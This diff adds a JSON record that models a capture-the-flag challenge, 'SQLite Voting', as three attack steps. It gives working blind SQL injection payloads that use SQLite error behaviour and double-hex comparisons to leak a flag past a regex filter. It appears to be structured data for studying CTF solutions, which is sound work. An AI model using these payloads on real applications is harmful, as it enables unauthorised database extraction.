@@ -1,0 +1,57 @@
+{
+    "AttackModel": {
+        "NameOfTheChallenge": "SQLite Voting",
+        "AttackerCapabilities": [
+            "SQL injection",
+            "Understanding of regular expressions",
+            "Knowledge of SQLite syntax and functions"
+        ],
+        "Target": {
+            "Type": "Web Application",
+            "Vulnerabilities": [
+                "Filtered error-based blind SQL injection"
+            ],
+            "SecurityMeasures": [
+                "Input validation using regular expressions"
+            ]
+        },
+        "Steps": [
+            {
+                "StepNumber": 1,
+                "Description": "Enumerate the length of the flag by injecting a payload",
+                "ToolsUsed": null,
+                "StepDetails": {
+                    "Hypothesis": "The attacker is trying to determine the length of the flag in order to perform further actions.",
+                    "Action": "Inject the payload 'abs(ifnull(nullif(length((SELECT(flag)from(flag))),$LENGTH$),0x8000000000000000))' to check if the length of the flag is equal to the specified length.",
+                    "Result": "The payload returns the length of the flag as 38 characters.",
+                    "Success": "Success",
+                    "FailingReason": null
+                }
+            },
+            {
+                "StepNumber": 2,
+                "Description": "Double hex the flag to ensure it only produces digits",
+                "ToolsUsed": null,
+                "StepDetails": {
+                    "Hypothesis": "The attacker wants to ensure that the flag only consists of digits for further processing.",
+                    "Action": "Execute the query 'select hex('0123456789ABCDEF')' to obtain the double hex representation of the digits.",
+                    "Result": "The double hex representation of the digits is '30313233343536373839414243444546'.",
+                    "Success": "Success",
+                    "FailingReason": null
+                }
+            },
+            {
+                "StepNumber": 3,
+                "Description": "Iterate over all composited 152-digit long numbers and use the max(A, B) function to find the greater one",
+                "ToolsUsed": null,
+                "StepDetails": {
+                    "Hypothesis": "The attacker wants to find the maximum value between the double hexed flag and a 152-digit long number.",
+                    "Action": "Inject the payload 'abs(ifnull(nullif(max(hex(hex((SELECT(flag)from(flag)))),$NUMBER$),$NUMBER$),0x8000000000000000))' to compare the double hexed flag with the 152-digit long number.",
+                    "Result": "The payload returns the double hexed flag.",
+                    "Success": "Success",
+                    "FailingReason": null
+                }
+            }
+        ]
+    }
+}
